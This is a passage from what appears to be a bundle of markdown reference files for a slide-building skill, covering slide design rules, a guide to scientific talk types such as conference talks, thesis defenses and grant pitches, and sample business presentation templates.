(#1A202C)\n- Black (#000000)\n\n**Advantages**:\n- Modern, sophisticated\n- Good for dark venues\n- Reduces eye strain in dark rooms\n- Makes colors pop\n\n**Disadvantages**:\n- Requires light-colored text\n- Can be difficult in bright rooms\n- Some projectors handle poorly\n\n**Gradient Backgrounds**:\n- Subtle gradients acceptable (light to lighter)\n- Avoid busy or high-contrast gradients\n- Do not distract from content\n\n**Image Backgrounds**:\n- Use only for title/section slides\n- Ensure sufficient contrast with text\n- Add semi-transparent overlay if needed\n- Avoid busy or cluttered images\n\n### Borders and Frames\n\n**Minimal Approach** (Recommended):\n- No borders on most slides\n- Let white space define boundaries\n- Clean, modern appearance\n\n**Selective Borders**:\n- Around key figures for emphasis\n- Separating distinct sections\n- Highlighting callout boxes\n- Simple, thin lines only\n\n**Avoid**:\n- Decorative borders\n- Thick, colorful frames\n- Clipart-style elements\n- 3D effects and shadows\n\n## Visual Elements\n\n### Icons and Graphics\n\n**Purpose**:\n- Visual anchors for concepts\n- Break up text-heavy slides\n- Quick recognition of section types\n- Add visual interest\n\n**Best Practices**:\n- Consistent style (all outline or all filled)\n- Simple, recognizable designs\n- Appropriate size (not too large or small)\n- Limited color palette matching theme\n- Avoid clipart or cartoonish graphics (unless appropriate)\n- Do not use for decoration only (should convey meaning)\n\n**Sources**:\n- Font Awesome\n- Noun Project\n- Material Design Icons\n- Custom scientific illustrations\n\n### Bullets and Lists\n\n**Bullet Styles**:\n- **Simple shapes**: Circle (), square (), dash ()\n- **Avoid**: Complex symbols, changing bullet styles within list\n- **Hierarchy**: Different bullets for different levels\n\n**List Best Practices**:\n- Maximum 4-6 items per list\n- Parallel structure (all start with verb, or all nouns, etc.)\n- Use fragments, not complete sentences\n- Adequate spacing between items (1.5-2 line height)\n\n**Alternative to Bullets**:\n- **Numbered lists**: When order matters\n- **Icons**: Visual representation of each point\n- **Progressive builds**: Reveal one point at a time\n- **Separate slides**: One concept per slide\n\n### Shapes and Dividers\n\n**Uses**:\n- Background rectangles to highlight content\n- Arrows showing relationships or flow\n- Circles for emphasis or grouping\n- Lines separating sections\n\n**Guidelines**:\n- Keep shapes simple (rectangles, circles, lines)\n- Use brand colors\n- Maintain consistency\n- Avoid 3D effects\n- Don't overuse\n\n## Animation and Builds\n\n### When to Use Animation\n\n**Appropriate Uses**:\n- **Progressive disclosure**: Reveal bullet points one at a time\n- **Build complex figures**: Add layers incrementally\n- **Show process**: Illustrate sequential steps\n- **Emphasize transitions**: Highlight connections\n- **Control pacing**: Prevent audience from reading ahead\n\n**Inappropriate Uses**:\n- Decoration or entertainment\n- Every slide transition\n- Multiple animations per slide\n- Distracting effects (spin, bounce, etc.)\n\n### Types of Animations\n\n**Entrance**:\n- **Appear**: Instant (good for fast-paced talks)\n- **Fade**: Subtle, professional\n- **Wipe**: Directional reveal\n- Avoid: Fly in, bounce, spiral, etc.\n\n**Exit**:\n- Rarely needed\n- Use to remove intermediary steps\n- Keep simple (fade or disappear)\n\n**Emphasis**:\n- Color change for highlighting\n- Bold/underline to draw attention\n- Grow slightly for importance\n- Use very sparingly\n\n**Builds**:\n- Reveal bullet points progressively\n- Add elements to complex figure\n- Show before/after states\n- Demonstrate process steps\n\n**Best Practices**:\n- Fast transitions (0.2-0.3 seconds)\n- Consistent animation type throughout\n- Click to advance (not automatic timing)\n- Builds should add clarity, not complexity\n\n## Common Design Mistakes\n\n### Content Mistakes\n\n**Too Much Text**:\n- Problem: Audience reads instead of listening\n- Fix: Use key phrases, not paragraphs; move details to notes\n\n**Too Many Concepts per Slide**:\n- Problem: Cognitive overload, unclear focus\n- Fix: One idea per slide; split complex slides into multiple\n\n**Inconsistent Formatting**:\n- Problem: Looks unprofessional, distracting\n- Fix: Use templates, maintain style guide\n\n**Poor Contrast**:\n- Problem: Illegible from distance\n- Fix: Test at actual presentation size, use high-contrast combinations\n\n**Tiny Fonts**:\n- Problem: Unreadable for audience\n- Fix: Minimum 18pt, preferably 24pt+ for body text\n\n### Visual Mistakes\n\n**Cluttered Slides**:\n- Problem: No clear focal point, overwhelming\n- Fix: Embrace white space, remove non-essential elements\n\n**Low-Quality Images**:\n- Problem: Pixelated or blurry figures\n- Fix: Use high-resolution images (300 DPI minimum)\n\n**Distracting Backgrounds**:\n- Problem: Competes with content\n- Fix: Simple, solid colors or subtle gradients\n\n**Overuse of Effects**:\n- Problem: Looks amateurish, distracting\n- Fix: Minimal or no shadows, gradients, 3D effects\n\n**Misaligned Elements**:\n- Problem: Appears careless\n- Fix: Use alignment tools, grids, and guides\n\n### Color Mistakes\n\n**Insufficient Contrast**:\n- Problem: Hard to read\n- Fix: Test with contrast checker, use dark on light or light on dark\n\n**Too Many Colors**:\n- Problem: Chaotic, unprofessional\n- Fix: Limit to 3-5 colors total\n\n**Red-Green Combinations**:\n- Problem: Invisible to color-blind audience members\n- Fix: Use blue-orange or add patterns/shapes\n\n**Clashing Colors**:\n- Problem: Visually jarring\n- Fix: Use color palette tools, test combinations\n\n## Accessibility\n\n### Designing for All Audiences\n\n**Visual Impairments**:\n- High contrast text (minimum 4.5:1, preferably 7:1)\n- Large fonts (minimum 18pt, prefer 24pt+)\n- Simple, clear fonts\n- No reliance on color alone to convey meaning\n\n**Color Blindness**:\n- Avoid red-green combinations\n- Use patterns, shapes, or labels in addition to color\n- Test with color blindness simulator\n- Provide alternative visual cues\n\n**Cognitive Considerations**:\n- Simple, uncluttered layouts\n- One concept per slide\n- Clear visual hierarchy\n- Consistent navigation and structure\n\n**Presentation Environment**:\n- Works in various lighting conditions\n- Visible from distance (back of large room)\n- Readable on different screens (laptop, projector, phone)\n- Printable in grayscale if needed\n\n### Alternative Text and Descriptions\n\n**For Figures**:\n- Provide verbal description during talk\n- Include detailed caption in notes\n- Describe key patterns: \"Notice the increasing trend...\"\n\n**For Complex Visuals**:\n- Break into components\n- Use progressive builds\n- Provide interpretive context\n\n## Design Workflow\n\n### Step 1: Define Visual Identity\n\nBefore creating slides:\n1. **Color palette**: Choose 3-5 colors\n2. **Fonts**: Select 1-2 font families\n3. **Style**: Decide on overall aesthetic (minimal, bold, traditional)\n4. **Templates**: Create master slides for different types\n\n### Step 2: Create Master Templates\n\nDesign 4-6 slide layouts:\n1. **Title slide**: Name, title, affiliation\n2. **Section divider**: Major transitions\n3. **Content slide**: Standard text/bullets\n4. **Figure slide**: Large visual focus\n5. **Two-column**: Text + figure side-by-side\n6. **Closing**: Questions, contact, acknowledgments\n\n### Step 3: Apply Consistently\n\nFor each slide:\n- Choose appropriate template\n- Add content (text or visuals)\n- Ensure alignment and spacing\n- Check font sizes and contrast\n- Verify consistency with other slides\n\n### Step 4: Review and Refine\n\nReview checklist:\n- [ ] Every slide has clear focus\n- [ ] Text is minimal and readable\n- [ ] Visual hierarchy is clear\n- [ ] Colors are consistent and accessible\n- [ ] Alignment is precise\n- [ ] White space is adequate\n- [ ] Animations are purposeful\n- [ ] Overall flow is smooth\n\n## Tools and Resources\n\n### Design Software\n\n**PowerPoint**:\n- Master slides for templates\n- Alignment guides and gridlines\n- Design Ideas feature for inspiration\n- Morph transition for smooth animations\n\n**Keynote** (Mac):\n- Beautiful default templates\n- Smooth animations\n- Magic Move for object transitions\n\n**Google Slides**:\n- Collaborative editing\n- Cloud-based access\n- Simple, clean interface\n\n**LaTeX Beamer**:\n- Consistent, professional appearance\n- Excellent for equations and code\n- Version control friendly\n- Reproducible designs\n\n### Design Resources\n\n**Color Tools**:\n- Coolors.co: Palette generator\n- Adobe Color: Color scheme creator\n- WebAIM Contrast Checker: Accessibility testing\n- Coblis: Color blindness simulator\n\n**Icon Sources**:\n- Font Awesome: General icons\n- Noun Project: Specific concepts\n- BioIcons: Science-specific graphics\n- Flaticon: Large collection\n\n**Inspiration**:\n- Scientific presentation examples in your field\n- TED talks for delivery style\n- Conference websites for design trends\n- Design portfolios (Behance, Dribbble)\n\n## Summary Checklist\n\nBefore finalizing your slide design:\n\n**Typography**:\n- [ ] Font size 18pt minimum, preferably 24pt+ for body\n- [ ] Maximum 6 bullets per slide, 6 words per bullet\n- [ ] Sans-serif fonts used throughout\n- [ ] Consistent font family (1-2 max)\n\n**Color**:\n- [ ] High contrast text-background (4.5:1 minimum)\n- [ ] Limited color palette (3-5 colors)\n- [ ] Color-blind safe combinations\n- [ ] Consistent color use throughout\n\n**Layout**:\n- [ ] One main idea per slide\n- [ ] Generous white space (don't fill every pixel)\n- [ ] Elements aligned precisely\n- [ ] Consistent layouts for similar content\n\n**Visual Elements**:\n- [ ] High-resolution images (300 DPI)\n- [ ] Consistent icon/graphic style\n- [ ] Minimal decorative elements\n- [ ] Clear visual hierarchy\n\n**Accessibility**:\n- [ ] Readable from back of room\n- [ ] Works in various lighting conditions\n- [ ] No reliance on color alone\n- [ ] Clear without audio (for recorded talks)\n\n**Professional Polish**:\n- [ ] Consistent template throughout\n- [ ] No typos or formatting errors\n- [ ] Smooth animations (if any)\n- [ ] Clean, uncluttered appearance\n",
        "plugins/sys-research/skills/architecting-slides/references/talk_types_guide.md": "# Scientific Talk Types Guide\n\n## Overview\n\nDifferent presentation contexts require different approaches, structures, and emphasis. This guide provides detailed guidance for common scientific talk types: conference presentations, academic seminars, thesis defenses, grant pitches, and journal club presentations.\n\n## Conference Talks\n\n### Context and Expectations\n\n**Typical Characteristics**:\n- **Duration**: 10-20 minutes (15 minutes most common)\n- **Audience**: Mix of specialists and non-specialists in your field\n- **Setting**: Concurrent sessions, audience may arrive late\n- **Goal**: Communicate key findings, generate interest, network\n- **Format**: Often followed by 2-5 minutes of questions\n\n**Challenges**:\n- Limited time for comprehensive coverage\n- Competing with other interesting talks\n- Audience fatigue (many talks in one day)\n- May be recorded or photographed\n- Need to make strong impression quickly\n\n### Structure for 15-Minute Conference Talk\n\n**Recommended Slide Count**: 15-18 slides\n\n**Time Allocation**:\n```\nIntroduction (2-3 minutes, 2-3 slides):\n- Title + hook (30 seconds)\n- Background and significance (90 seconds)\n- Research question (60 seconds)\n\nMethods (2-3 minutes, 2-3 slides):\n- Study design overview\n- Key methodological approach\n- Analysis strategy\n\nResults (6-7 minutes, 6-8 slides):\n- Primary finding (2-3 minutes, 2-3 slides)\n- Secondary finding (2 minutes, 2 slides)\n- Additional validation (2 minutes, 2-3 slides)\n\nDiscussion (2-3 minutes, 3-4 slides):\n- Interpretation\n- Comparison to prior work\n- Implications\n- Limitations\n\nConclusion (1 minute, 1-2 slides):\n- Key takeaways\n- Acknowledgments\n```\n\n### Conference Talk Best Practices\n\n**Opening**:\n- GOOD Start with attention-grabbing hook (surprising fact, compelling image)\n- GOOD Clearly state why this work matters\n- GOOD Preview main finding early (\"spoiler alert\" acceptable)\n- BAD Don't spend >2 minutes on background\n- BAD Don't start with \"I'm honored to be here...\"\n\n**Content**:\n- GOOD Focus on 1-2 key findings (not everything from paper)\n- GOOD Use compelling visuals\n- GOOD Show data, not just conclusions\n- GOOD Explain implications clearly\n- BAD Don't go into excessive methodological detail\n- BAD Don't include every analysis from paper\n- BAD Don't use small fonts or busy slides\n\n**Delivery**:\n- GOOD Practice to ensure exact timing\n- GOOD Make eye contact with audience\n- GOOD Show enthusiasm for your work\n- GOOD End with clear, memorable conclusion\n- BAD Don't run over time (extremely unprofessional)\n- BAD Don't rush through slides at end\n- BAD Don't read slides verbatim\n\n**Q&A Strategy**:\n- Prepare backup slides with extra data\n- Anticipate likely questions\n- Keep answers concise (30-60 seconds)\n- Direct skeptics to poster or paper for details\n- Have business cards or contact info ready\n\n### Lightning Talks (5-7 Minutes)\n\n**Ultra-Focused Structure**:\n```\nSlide 1: Title (15 seconds)\nSlide 2: The Problem (45 seconds)\nSlide 3: Your Approach (60 seconds)\nSlide 4-5: Key Result (2-3 minutes)\nSlide 6: Impact/Implications (45 seconds)\nSlide 7: Conclusion + Contact (30 seconds)\n```\n\n**Key Principles**:\n- ONE main message only\n- Maximize visuals, minimize text\n- No methods details (just mention approach)\n- Practice exact timing rigorously\n- Make memorable impression\n- Goal: Generate \"tell me more\" conversations\n\n### Poster Spotlight Talks (3 Minutes)\n\n**Purpose**: Drive traffic to poster session\n\n**Structure**:\n```\n1 slide: Title + Context (30 seconds)\n2 slides: Problem + Approach (60 seconds)\n2 slides: Most Interesting Result (60 seconds)\n1 slide: \"Visit my poster at #42\" (30 seconds)\n```\n\n**Tips**:\n- Show teaser, not full story\n- Include poster number prominently\n- Use QR code for details\n- Explicitly invite audience: \"Come ask me about...\"\n\n## Academic Seminars\n\n### Context and Expectations\n\n**Typical Characteristics**:\n- **Duration**: 45-60 minutes\n- **Audience**: Department faculty, students, postdocs\n- **Setting**: Single presentation, full attention\n- **Goal**: Deep dive into research, get feedback, show expertise\n- **Format**: Extended Q&A (10-15 minutes), interruptions welcome\n\n**Challenges**:\n- Maintaining engagement for longer duration\n- Balancing depth and accessibility\n- Handling interruptions smoothly\n- Demonstrating mastery of broader field\n- Satisfying both experts and non-experts\n\n### Structure for 50-Minute Seminar\n\n**Recommended Slide Count**: 40-50 slides\n\n**Time Allocation**:\n```\nIntroduction (8-10 minutes, 8-10 slides):\n- Personal introduction (1 minute)\n- Big picture context (3-4 minutes)\n- Literature review (3-4 minutes)\n- Research questions (1-2 minutes)\n- Roadmap/outline (1 minute)\n\nMethods (8-10 minutes, 8-10 slides):\n- Study design with rationale (2-3 minutes)\n- Participants/materials (2 minutes)\n- Procedures (3-4 minutes)\n- Analysis approach (2 minutes)\n\nResults (18-22 minutes, 16-20 slides):\n- Overview/demographics (2 minutes)\n- Main finding 1 (6-8 minutes)\n- Main finding 2 (6-8 minutes)\n- Additional analyses (4-6 minutes)\n- Summary slide (1 minute)\n\nDiscussion (10-12 minutes, 8-10 slides):\n- Summary of findings (2 minutes)\n- Relation to literature (3-4 minutes)\n- Mechanisms/explanations (2-3 minutes)\n- Limitations (2 minutes)\n- Implications (2 minutes)\n\nConclusion (2-3 minutes, 2-3 slides):\n- Key messages (1 minute)\n- Future directions (1-2 minutes)\n- Acknowledgments (30 seconds)\n```\n\n### Seminar Best Practices\n\n**Opening**:\n- GOOD Establish credibility and context\n- GOOD Make personal connection to research\n- GOOD Show enthusiasm and passion\n- GOOD Provide roadmap of talk structure\n- BAD Don't assume all background knowledge\n- BAD Don't be overly formal or stiff\n\n**Content**:\n- GOOD Go deeper into methods than conference talk\n- GOOD Show multiple related findings or studies\n- GOOD Discuss failed experiments and pivots (shows thinking)\n- GOOD Present ongoing/unpublished work\n- GOOD Connect to broader theoretical questions\n- BAD Don't present every detail of every analysis\n- BAD Don't ignore alternative explanations\n- BAD Don't oversell findings\n\n**Engagement**:\n- GOOD Welcome interruptions: \"Please feel free to ask questions\"\n- GOOD Use checkpoint questions: \"Does this make sense?\"\n- GOOD Engage with questioners genuinely\n- GOOD Admit what you don't know\n- GOOD Ask audience for input on challenges\n- BAD Don't be defensive about criticism\n- BAD Don't dismiss questions as \"off topic\"\n- BAD Don't monopolize Q&A time\n\n**Pacing**:\n- Build in natural pause points\n- Don't rush (you have time)\n- Vary delivery speed and tone\n- Use humor appropriately\n- Monitor audience engagement\n\n### Job Talk Considerations\n\n**Additional Expectations**:\n- Show research program trajectory (past  present  future)\n- Demonstrate independent thinking\n- Show you can mentor students\n- Explain funding strategy\n- Fit with department emphasized\n- Teaching philosophy may be discussed\n\n**Structure Adaptation**:\n- Add \"Future Directions\" section (5 minutes, 3-4 slides)\n- Show multiple projects if relevant\n- Discuss collaborative opportunities\n- Mention grant applications/funding\n\n## Thesis and Dissertation Defenses\n\n### Context and Expectations\n\n**Typical Characteristics**:\n- **Duration**: 30-60 minutes (varies by institution)\n- **Audience**: Committee, colleagues, family\n- **Setting**: Formal examination\n- **Goal**: Demonstrate mastery, defend research decisions\n- **Format**: Extended Q&A (30-90 minutes), private or public\n\n**Unique Aspects**:\n- Committee has read dissertation\n- Questioning can be extensive and critical\n- Evaluation of student's independence and expertise\n- May include private committee discussion\n- Career milestone, significant pressure\n\n### Structure for 45-Minute Defense\n\n**Recommended Slide Count**: 40-50 slides\n\n**Time Allocation**:\n```\nIntroduction (5 minutes, 5-6 slides):\n- Research context and motivation\n- Central thesis question\n- Overview of studies/chapters\n- Roadmap\n\nLiterature Review (5 minutes, 4-5 slides):\n- Theoretical framework\n- Key prior findings\n- Knowledge gaps\n- Your contribution\n\nStudy 1 (8-10 minutes, 10-12 slides):\n- Research question\n- Methods\n- Results\n- Interim conclusions\n\nStudy 2 (8-10 minutes, 10-12 slides):\n- Research question\n- Methods\n- Results\n- Interim conclusions\n\nStudy 3 (optional) (8-10 minutes, 10-12 slides):\n- Research question\n- Methods\n- Results\n- Interim conclusions\n\nGeneral Discussion (8-10 minutes, 8-10 slides):\n- Synthesis across studies\n- Theoretical implications\n- Practical applications\n- Limitations (comprehensive)\n- Future research directions\n\nConclusions (2-3 minutes, 2-3 slides):\n- Main contributions\n- Final thoughts\n- Acknowledgments\n```\n\n### Defense Best Practices\n\n**Preparation**:\n- GOOD Practice extensively (5+ times)\n- GOOD Anticipate every possible question\n- GOOD Prepare backup slides with extra analyses\n- GOOD Review key literature thoroughly\n- GOOD Understand limitations deeply\n- GOOD Practice Q&A with colleagues\n- BAD Don't assume committee remembers all details\n- BAD Don't leave preparation to last minute\n\n**Content**:\n- GOOD Comprehensive coverage of all studies\n- GOOD Clear connection between studies\n- GOOD Address limitations proactively\n- GOOD Show theoretical contribution\n- GOOD Demonstrate independent thinking\n- GOOD Acknowledge contributions of others\n- BAD Don't minimize limitations\n- BAD Don't oversell findings\n- BAD Don't ignore null results\n\n**Q&A Approach**:\n- GOOD Listen carefully to full question\n- GOOD Pause before answering (shows thoughtfulness)\n- GOOD Admit when you don't know\n- GOOD Engage with criticism constructively\n- GOOD Refer to specific slides or dissertation sections\n- GOOD Thank questioner for insights\n- BAD Don't be defensive or argumentative\n- BAD Don't dismiss concerns\n- BAD Don't ramble in answers\n\n**Handling Difficult Questions**:\n- **Critique of methods**: Acknowledge limitation, explain rationale, note in future work\n- **Alternative interpretations**: \"That's an interesting perspective. I focused on X because... but Y is worth exploring\"\n- **Why didn't you do X?**: \"That would be valuable. Due to [constraint], I prioritized... Future work should examine that\"\n- **Contradiction in results**: \"You're right that seems inconsistent. One possible explanation is...\"\n\n## Grant Pitches and Funding Presentations\n\n### Context and Expectations\n\n**Typical Characteristics**:\n- **Duration**: 10-20 minutes (varies widely)\n- **Audience**: Funding panel, non-specialists, decision-makers\n- **Setting**: Evaluative, competitive\n- **Goal**: Secure funding, demonstrate feasibility and impact\n- **Format**: Presentation + Q&A focused on logistics and impact\n\n**Evaluation Criteria**:\n- Significance and innovation\n- Approach and feasibility\n- Investigator qualifications\n- Environment and resources\n- Budget justification\n\n### Structure for 15-Minute Grant Pitch\n\n**Recommended Slide Count**: 12-15 slides\n\n**Time Allocation**:\n```\nSignificance (3-4 minutes, 3-4 slides):\n- Problem statement with impact (90 seconds)\n- Current state and limitations (90 seconds)\n- Opportunity and innovation (60-90 seconds)\n\nApproach (5-6 minutes, 5-6 slides):\n- Overall strategy (60 seconds)\n- Aim 1: Approach and expected outcomes (90 seconds)\n- Aim 2: Approach and expected outcomes (90 seconds)\n- Aim 3: Approach and expected outcomes (optional, 90 seconds)\n- Timeline and milestones (60 seconds)\n\nImpact and Feasibility (4-5 minutes, 3-4 slides):\n- Preliminary data (2 minutes)\n- Expected impact (1 minute)\n- Team and resources (1 minute)\n- Alternative strategies for risks (60 seconds)\n\nConclusion (1 minute, 1 slide):\n- Summary of innovation and impact\n- Budget highlight (if appropriate)\n```\n\n### Grant Pitch Best Practices\n\n**Significance**:\n- GOOD Lead with impact (lives saved, costs reduced, knowledge gained)\n- GOOD Use compelling statistics and real-world examples\n- GOOD Clearly state innovation (what's new?)\n- GOOD Connect to funder's mission and priorities\n- BAD Don't assume audience knows why it matters\n- BAD Don't be vague about expected outcomes\n\n**Approach**:\n- GOOD Show feasibility (you can actually do this)\n- GOOD Present clear, logical aims\n- GOOD Show preliminary data demonstrating proof-of-concept\n- GOOD Explain why your approach will work\n- GOOD Address potential challenges proactively\n- BAD Don't be overly technical\n- BAD Don't ignore obvious challenges\n- BAD Don't propose unrealistic timelines\n\n**Team and Resources**:\n- GOOD Highlight key personnel expertise\n- GOOD Show institutional support\n- GOOD Mention prior funding success\n- GOOD Demonstrate appropriate resources available\n- BAD Don't undersell your qualifications\n- BAD Don't propose work beyond your expertise without collaborators\n\n**Q&A Focus**:\n- Expect questions about:\n  - Budget justification\n  - Timeline and milestones\n  - What if Aim 1 fails?\n  - How is this different from X's work?\n  - How will you sustain this beyond grant period?\n  - Dissemination and translation plans\n\n## Journal Club Presentations\n\n### Context and Expectations\n\n**Typical Characteristics**:\n- **Duration**: 20-45 minutes\n- **Audience**: Lab members, colleagues, students\n- **Setting**: Educational, critical discussion\n- **Goal**: Understand paper, critique methods, discuss implications\n- **Format**: Heavy Q&A, interactive discussion\n\n**Unique Aspects**:\n- Presenting others' work, not your own\n- Critical analysis expected\n- Audience may have read paper\n- Educational component important\n- Discussion more important than presentation\n\n### Structure for 30-Minute Journal Club\n\n**Recommended Slide Count**: 15-20 slides\n\n**Time Allocation**:\n```\nContext (2-3 minutes, 2-3 slides):\n- Paper citation and authors\n- Why you chose this paper\n- Background and significance\n\nIntroduction (3-4 minutes, 2-3 slides):\n- Research question\n- Prior work and gaps\n- Hypotheses\n\nMethods (5-7 minutes, 4-6 slides):\n- Study design\n- Participants/materials\n- Procedures\n- Analysis approach\n- Your assessment of methods\n\nResults (8-10 minutes, 5-7 slides):\n- Main findings\n- Key figures explained\n- Statistical results\n- Your interpretation\n\nDiscussion (5-7 minutes, 3-4 slides):\n- Authors' interpretation\n- Strengths of study\n- Limitations and concerns\n- Implications for field\n- Future directions\n\nCritical Analysis (3-5 minutes, 1-2 slides):\n- What did we learn?\n- What questions remain?\n- How does this change our thinking?\n- Relevance to our work\n```\n\n### Journal Club Best Practices\n\n**Preparation**:\n- GOOD Read paper multiple times\n- GOOD Read key cited references\n- GOOD Look up unfamiliar methods or concepts\n- GOOD Check other papers from same group\n- GOOD Prepare critical questions for discussion\n- BAD Don't just summarize without analysis\n\n**Presentation**:\n- GOOD Explain paper clearly (not everyone may have read it)\n- GOOD Highlight key figures and data\n- GOOD Point out strengths and innovations\n- GOOD Identify limitations or concerns\n- GOOD Be fair but critical\n- GOOD Connect to group's research interests\n- BAD Don't just read the paper aloud\n- BAD Don't be overly harsh or dismissive\n- BAD Don't skip methods (often most important)\n\n**Critical Analysis**:\n- GOOD Question methodological choices\n- GOOD Consider alternative interpretations\n- GOOD Identify what's missing\n- GOOD Discuss implications thoughtfully\n- GOOD Suggest follow-up experiments\n- BAD Don't accept everything at face value\n- BAD Don't nitpick minor issues while missing major flaws\n- BAD Don't let personal biases dominate\n\n**Discussion Facilitation**:\n- Pose open-ended questions\n- \"What do you think about their interpretation of Figure 3?\"\n- \"Is this the right control experiment?\"\n- \"How would you design the follow-up study?\"\n- Encourage quiet members to contribute\n- Keep discussion focused and productive\n\n## Industry and Investor Presentations\n\n### Context and Expectations\n\n**Typical Characteristics**:\n- **Duration**: 10-30 minutes (often shorter)\n- **Audience**: Non-scientists, business decision-makers\n- **Setting**: High stakes, evaluative\n- **Goal**: Secure investment, partnership, or approval\n- **Format**: Emphasis on business case and timeline\n\n**Key Differences from Academic Talks**:\n- Emphasis on applications, not mechanisms\n- Market size and competition important\n- Intellectual property considerations\n- Return on investment focus\n- Less technical detail expected\n\n### Structure for 20-Minute Industry Pitch\n\n**Time Allocation**:\n```\nProblem and Market (3-4 minutes):\n- Unmet need or problem\n- Market size and opportunity\n- Current solutions and limitations\n\nSolution (4-5 minutes):\n- Your technology or approach\n- Key innovations\n- Proof of concept data\n- Advantages over alternatives\n\nDevelopment Plan (5-6 minutes):\n- Current status (TRL/stage)\n- Development roadmap\n- Key milestones and timeline\n- Regulatory pathway (if applicable)\n\nBusiness Case (4-5 minutes):\n- Target customers/users\n- Revenue model\n- Competitive landscape\n- Intellectual property status\n- Team and partnerships\n\nFunding Ask (2-3 minutes):\n- Investment needed\n- Use of funds\n- Expected outcomes\n- Exit strategy or ROI\n```\n\n### Industry Pitch Best Practices\n\n**Language**:\n- GOOD Simple, clear language (no jargon)\n- GOOD Focus on benefits and outcomes\n- GOOD Use business metrics (TAM, SAM, SOM)\n- GOOD Emphasize competitive advantages\n- BAD Don't use academic terminology\n- BAD Don't focus on mechanistic details\n- BAD Don't ignore commercial viability\n\n**Emphasis**:\n- Lead with problem and market opportunity\n- Show proof of concept clearly\n- Demonstrate clear path to commercialization\n- Highlight team's ability to execute\n- Be realistic about risks and challenges\n\n## Teaching and Tutorial Presentations\n\n### Context and Expectations\n\n**Typical Characteristics**:\n- **Duration**: 45-90 minutes\n- **Audience**: Students, learners, varied expertise\n- **Setting**: Educational, classroom or workshop\n- **Goal**: Teach concepts, methods, or skills\n- **Format**: Interactive, may include exercises\n\n**Structure for 60-Minute Tutorial**:\n```\nIntroduction (5 minutes):\n- Learning objectives\n- Why this topic matters\n- Prerequisites and assumptions\n\nFoundations (10-15 minutes):\n- Essential background\n- Key concepts defined\n- Simple examples\n\nCore Content - Part 1 (15-20 minutes):\n- Main topic area 1\n- Detailed explanation\n- Examples and demonstrations\n\nCore Content - Part 2 (15-20 minutes):\n- Main topic area 2\n- Detailed explanation\n- Examples and demonstrations\n\nPractice/Application (10-15 minutes):\n- Hands-on exercise or case study\n- Q&A and discussion\n- Common pitfalls\n\nSummary (5 minutes):\n- Key takeaways\n- Resources for further learning\n- Next steps\n```\n\n### Tutorial Best Practices\n\n**Content**:\n- GOOD Build complexity gradually\n- GOOD Use many examples\n- GOOD Repeat key concepts\n- GOOD Check understanding frequently\n- GOOD Provide resources and references\n- BAD Don't assume prior knowledge\n- BAD Don't move too quickly\n\n**Engagement**:\n- GOOD Ask questions to audience\n- GOOD Include interactive elements\n- GOOD Use demonstrations\n- GOOD Encourage questions throughout\n- GOOD Provide practice opportunities\n- BAD Don't lecture non-stop for 60 minutes\n\n## Summary: Choosing the Right Approach\n\n| Talk Type | Duration | Audience | Depth | Key Focus |\n|-----------|----------|----------|-------|-----------|\n| Lightning | 5-7 min | General | Minimal | One key finding |\n| Conference | 15 min | Specialists | Moderate | Main results |\n| Seminar | 45-60 min | Experts | Deep | Comprehensive |\n| Defense | 45-60 min | Committee | Complete | All studies |\n| Grant | 15-20 min | Mixed | Moderate | Impact & feasibility |\n| Journal Club | 30-45 min | Lab group | Critical | Methods & interpretation |\n| Industry | 15-30 min | Non-scientists | Applied | Business case |\n\n### Adaptation Checklist\n\nWhen preparing any talk, consider:\n\n- [ ] Who is my audience? (Expertise level, background, expectations)\n- [ ] How much time do I have? (Strictly enforced or flexible?)\n- [ ] What is the goal? (Inform, persuade, teach, impress?)\n- [ ] What format is expected? (Formal vs. interactive, Q&A style)\n- [ ] What will happen afterward? (Q&A, discussion, evaluation, networking)\n- [ ] What are the logistics? (Room size, A/V setup, recording, remote?)\n\nAdapt your structure, content depth, language, and delivery style accordingly.\n",
        "plugins/sys-research/skills/architecting-slides/references/templates.md": "# Presentation Templates\n\n## Template 1: Executive Summary Slide\n\n```\n\n  KEY INSIGHT                                                \n  \n                                                             \n  \"Customers who complete onboarding in week 1               \n   have 3x higher lifetime value\"                           \n                                                             \n\n                                                            \n  THE DATA              THE IMPLICATION                     \n                                                            \n  Week 1 completers:     Prioritize onboarding UX           \n   LTV: $4,500          Add day-1 success milestones     \n   Retention: 85%       Proactive week-1 outreach        \n   NPS: 72                                                 \n                        Investment: $75K                   \n  Others:               Expected ROI: 8x                   \n   LTV: $1,500                                             \n   Retention: 45%                                          \n   NPS: 34                                                 \n                                                            \n\n```\n\n## Template 2: Data Story Flow\n\n```\nSlide 1: THE HEADLINE\n\"We can grow 40% faster by fixing onboarding\"\n\nSlide 2: THE CONTEXT\nCurrent state metrics\nIndustry benchmarks\nGap analysis\n\nSlide 3: THE DISCOVERY\nWhat the data revealed\nSurprising finding\nPattern identification\n\nSlide 4: THE DEEP DIVE\nRoot cause analysis\nSegment breakdowns\nStatistical significance\n\nSlide 5: THE RECOMMENDATION\nProposed actions\nResource requirements\nTimeline\n\nSlide 6: THE IMPACT\nExpected outcomes\nROI calculation\nRisk assessment\n\nSlide 7: THE ASK\nSpecific request\nDecision needed\nNext steps\n```\n\n## Template 3: One-Page Dashboard Story\n\n```markdown\n# Monthly Business Review: January 2024\n\n## THE HEADLINE\nRevenue up 15% but CAC increasing faster than LTV\n\n## KEY METRICS AT A GLANCE\n\n  MRR     NRR     CAC     LTV   \n $125K   108%    $450    $2,200 \n  15%    3%     22%    8%   \n\n\n## WHAT'S WORKING\n Enterprise segment growing 25% MoM\n Referral program driving 30% of new logos\n Support satisfaction at all-time high (94%)\n\n## WHAT NEEDS ATTENTION\n SMB acquisition cost up 40%\n Trial conversion down 5 points\n Time-to-value increased by 3 days\n\n## ROOT CAUSE\n[Mini chart showing SMB vs Enterprise CAC trend]\nSMB paid ads becoming less efficient.\nCPC up 35% while conversion flat.\n\n## RECOMMENDATION\n1. Shift $20K/mo from paid to content\n2. Launch SMB self-serve trial\n3. A/B test shorter onboarding\n\n## NEXT MONTH'S FOCUS\n- Launch content marketing pilot\n- Complete self-serve MVP\n- Reduce time-to-value to < 7 days\n```\n\n## Template 4: Quarterly Business Review (QBR)\n\n```markdown\n# Q4 2024 Business Review\n\n## Executive Summary\n- Revenue: $4.2M ( 23% QoQ)\n- Customers: 847 ( 18% QoQ)\n- Churn: 3.2% ( 0.8% QoQ)\n- NPS: 68 ( 5 points)\n\n## Quarter Highlights\n**Major Win:** Enterprise tier launched\n**Growth:** 3 largest deals closed\n**Launch:** Self-serve product catalog\n**Team:** Hired VP of Sales\n\n## Performance vs 